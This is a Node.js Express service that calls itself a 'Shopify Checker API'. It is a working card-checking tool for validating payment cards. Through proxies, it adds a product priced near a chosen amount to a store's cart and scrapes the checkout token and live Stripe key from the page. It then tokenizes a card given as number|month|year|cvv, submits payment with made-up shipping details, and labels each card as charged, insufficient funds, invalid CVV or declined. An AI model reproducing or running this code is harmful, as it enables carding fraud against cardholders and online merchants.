const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==========================================
// UTILIDADES
// ==========================================

function parseProxy(proxyStr) {
  if (!proxyStr) return null;
  const parts = proxyStr.split(':');
  if (parts.length === 4) {
    return {
      server: `http://${parts[0]}:${parts[1]}`,
      username: parts[2],
      password: parts[3]
    };
  } else if (parts.length === 2) {
    return { server: `http://${parts[0]}:${parts[1]}` };
  }
  return null;
}

function createProxyAgent(proxyConfig) {
  if (!proxyConfig) return undefined;
  const auth = proxyConfig.username ? `${proxyConfig.username}:${proxyConfig.password}@` : '';
  const url = `http://${auth}${proxyConfig.server.replace('http://', '')}`;
  return new HttpsProxyAgent(url);
}

// ==========================================
// PASO 1: OBTENER VARIANT_ID POR PRECIO
// ==========================================
async function getVariantIdByPrice(site, targetPrice, proxyAgent) {
  try {
    const response = await axios.get(`${site}/products.json?limit=250`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json'
      },
      httpsAgent: proxyAgent,
      timeout: 15000
    });

    const products = response.data.products || [];
    if (products.length === 0) return null;

    if (!targetPrice || targetPrice <= 0) {
      return {
        variantId: products[0].variants[0].id,
        price: parseFloat(products[0].variants[0].price),
        productTitle: products[0].title
      };
    }

    let bestVariant = null;
    let bestProduct = null;
    let bestDiff = Infinity;

    for (const product of products) {
      for (const variant of product.variants) {
        if (!variant.available) continue;
        const price = parseFloat(variant.price);
        const diff = Math.abs(price - targetPrice);
        if (diff < bestDiff) {
          bestDiff = diff;
          bestVariant = variant;
          bestProduct = product;
        }
      }
    }

    if (!bestVariant) return null;

    return {
      variantId: bestVariant.id,
      price: parseFloat(bestVariant.price),
      productTitle: bestProduct.title
    };
  } catch (e) {
    console.error(`[getVariantIdByPrice] ${e.message}`);
    return null;
  }
}

// ==========================================
// PASO 2: AÑADIR AL CARRITO
// ==========================================
async function addToCart(site, variantId, proxyAgent, cookieJar) {
  try {
    const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
    
    const response = await client.post(`${site}/cart/add.js`, {
      id: variantId,
      quantity: 1
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      timeout: 15000
    });

    return response.status === 200;
  } catch (e) {
    console.error(`[addToCart] ${e.message}`);
    return false;
  }
}

// ==========================================
// PASO 3: OBTENER EL CHECKOUT Y EL TOKEN
// ==========================================
async function getCheckoutToken(site, proxyAgent, cookieJar) {
  try {
    const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
    
    const response = await client.get(`${site}/checkout`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml'
      },
      timeout: 20000
    });

    const html = response.data;
    
    const tokenMatch = html.match(/"checkout_token"\s*:\s*"([^"]+)"/) || 
                       html.match(/name="checkout_token"\s+value="([^"]+)"/) ||
                       html.match(/"token"\s*:\s*"([^"]+)"/);
    
    const token = tokenMatch ? tokenMatch[1] : null;
    
    const stripeKeyMatch = html.match(/pk_live_[A-Za-z0-9]+/);
    const stripeKey = stripeKeyMatch ? stripeKeyMatch[0] : null;
    
    return { token, stripeKey, html };
  } catch (e) {
    console.error(`[getCheckoutToken] ${e.message}`);
    return null;
  }
}

// ==========================================
// PASO 4: TOKENIZAR LA TARJETA (STRIPE)
// ==========================================
async function tokenizeCard(cardNumber, month, year, cvv, stripeKey, proxyAgent) {
  try {
    const response = await axios.post('https://api.stripe.com/v1/payment_methods', 
      new URLSearchParams({
        'type': 'card',
        'card[number]': cardNumber,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'billing_details[address][postal_code]': '10001',
        'billing_details[address][country]': 'US'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Authorization': `Bearer ${stripeKey}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        httpsAgent: proxyAgent,
        timeout: 15000
      }
    );

    return response.data.id;
  } catch (e) {
    if (e.response && e.response.data && e.response.data.error) {
      return { error: e.response.data.error.message };
    }
    return { error: e.message };
  }
}

// ==========================================
// PASO 5: ENVIAR EL PAGO A SHOPIFY
// ==========================================
async function submitPayment(site, token, paymentMethodId, proxyAgent, cookieJar) {
  try {
    const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
    
    const response = await client.post(`${site}/checkout`, {
      checkout_token: token,
      payment_method_id: paymentMethodId,
      'checkout[email]': `test${Math.floor(Math.random() * 999999)}@gmail.com`,
      'checkout[shipping_address][first_name]': 'John',
      'checkout[shipping_address][last_name]': 'Doe',
      'checkout[shipping_address][address1]': '123 Main St',
      'checkout[shipping_address][city]': 'New York',
      'checkout[shipping_address][country]': 'United States',
      'checkout[shipping_address][province]': 'NY',
      'checkout[shipping_address][zip]': '10001',
      'checkout[shipping_address][phone]': '5555555555'
    }, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      timeout: 30000
    });

    const data = response.data;
    
    if (data.order_id || data.order_status === 'paid') {
      return { Response: "Charged (Order Paid)", Price: 0, Gateway: "Shopify", Status: true };
    }
    
    if (data.errors || data.error) {
      const errorMsg = JSON.stringify(data.errors || data.error);
      if (/insufficient_funds|insufficient funds/i.test(errorMsg)) {
        return { Response: "Insufficient Funds", Price: 0, Gateway: "Shopify", Status: false };
      }
      if (/invalid_cvv|incorrect_cvv/i.test(errorMsg)) {
        return { Response: "Invalid CVV", Price: 0, Gateway: "Shopify", Status: false };
      }
      if (/3d|verification_required/i.test(errorMsg)) {
        return { Response: "3D Secure Required", Price: 0, Gateway: "Shopify", Status: true };
      }
      return { Response: `Declined (${errorMsg.substring(0, 100)})`, Price: 0, Gateway: "Shopify", Status: false };
    }

    return { Response: "Declined (Unknown response)", Price: 0, Gateway: "Shopify", Status: false };
  } catch (e) {
    if (e.response && e.response.data) {
      return { Response: `Declined (${JSON.stringify(e.response.data).substring(0, 100)})`, Price: 0, Gateway: "Shopify", Status: false };
    }
    return { Response: `Site Error: ${e.message}`, Price: 0, Gateway: "Shopify", Status: false };
  }
}

// ==========================================
// FUNCIÓN PRINCIPAL
// ==========================================
async function checkCard(site, cc, targetPrice, proxyConfig) {
  try {
    let normalizedSite = site;
    if (!normalizedSite.startsWith('http')) {
      normalizedSite = `https://${normalizedSite}`;
    }
    normalizedSite = normalizedSite.replace(/\/$/, '');

    const proxyAgent = createProxyAgent(proxyConfig);
    const cookieJar = new CookieJar();

    const productData = await getVariantIdByPrice(normalizedSite, targetPrice, proxyAgent);
    if (!productData) {
      return { Response: "Site Error: No product found for price", Price: 0, Gateway: "Shopify", Status: false };
    }

    const added = await addToCart(normalizedSite, productData.variantId, proxyAgent, cookieJar);
    if (!added) {
      return { Response: "Site Error: Failed to add to cart", Price: productData.price, Gateway: "Shopify", Status: false };
    }

    const checkoutData = await getCheckoutToken(normalizedSite, proxyAgent, cookieJar);
    if (!checkoutData || !checkoutData.token) {
      return { Response: "Site Error: Failed to get checkout token", Price: productData.price, Gateway: "Shopify", Status: false };
    }

    if (!checkoutData.stripeKey) {
      return { Response: "Site Error: Unsupported gateway (no Stripe key)", Price: productData.price, Gateway: "Shopify", Status: false };
    }

    const [cardNumber, month, year, cvv] = cc.split('|');
    const fullYear = year.length === 2 ? `20${year}` : year;
    const paymentMethodId = await tokenizeCard(cardNumber, month, fullYear, cvv, checkoutData.stripeKey, proxyAgent);
    
    if (typeof paymentMethodId === 'object' && paymentMethodId.error) {
      const err = paymentMethodId.error.toLowerCase();
      if (err.includes('insufficient')) return { Response: "Insufficient Funds", Price: productData.price, Gateway: "Shopify", Status: false };
      if (err.includes('cvv')) return { Response: "Invalid CVV", Price: productData.price, Gateway: "Shopify", Status: false };
      if (err.includes('number')) return { Response: "Invalid Card Number", Price: productData.price, Gateway: "Shopify", Status: false };
      return { Response: `Declined (${paymentMethodId.error})`, Price: productData.price, Gateway: "Shopify", Status: false };
    }

    const result = await submitPayment(normalizedSite, checkoutData.token, paymentMethodId, proxyAgent, cookieJar);
    result.Price = productData.price;
    return result;

  } catch (err) {
    return { Response: `Site Error: ${err.message}`, Price: 0, Gateway: "Shopify", Status: false };
  }
}

// ==========================================
// ENDPOINT (GET y POST)
// ==========================================
app.all('/shopify', async (req, res) => {
  const site = req.query.site || req.body.site;
  const cc = req.query.cc || req.body.cc;
  const proxy = req.query.proxy || req.body.proxy;
  const price = req.query.price || req.body.price;

  if (!site || !cc) {
    return res.status(400).json({ Response: "Missing site or cc parameter", Price: 0, Gateway: "Unknown", Status: false });
  }

  const targetPrice = price ? parseFloat(price) : 0;
  const proxyConfig = parseProxy(proxy);

  console.log(`[CHECK] ${req.method} | Site: ${site} | Card: ${cc.substring(0, 6)}**** | Price: ${targetPrice}`);

  const result = await checkCard(site, cc, targetPrice, proxyConfig);
  console.log(`[RESULT] ${result.Response} | Status: ${result.Status}`);

  res.json(result);
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(`✅ Shopify Checker API (HTTP only) running on port ${PORT}`);
});
